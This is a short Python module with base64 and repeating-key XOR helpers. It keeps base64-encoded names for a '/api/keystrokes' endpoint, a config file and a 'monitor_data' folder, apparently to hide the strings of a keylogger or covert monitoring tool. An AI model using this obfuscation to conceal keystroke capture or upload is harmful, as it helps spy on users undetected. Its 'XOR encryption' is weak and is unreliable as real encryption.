import base64

def encode_string(text):
    """Encode string using base64"""
    return base64.b64encode(text.encode()).decode()

def decode_string(encoded):
    """Decode base64 string"""
    return base64.b64decode(encoded.encode()).decode()

def xor_encrypt(data, key):
    """Simple XOR encryption"""
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    
    return bytes(result)

def xor_decrypt(data, key):
    """Simple XOR decryption (same as encryption)"""
    return xor_encrypt(data, key)

# Pre-encoded sensitive strings (example)
ENCODED_STRINGS = {
    'api_endpoint': encode_string('/api/keystrokes'),
    'config_file': encode_string('config.json'),
    'data_dir': encode_string('monitor_data')
}

def get_decoded_string(key):
    """Get decoded string by key"""
    if key in ENCODED_STRINGS:
        return decode_string(ENCODED_STRINGS[key])
    return None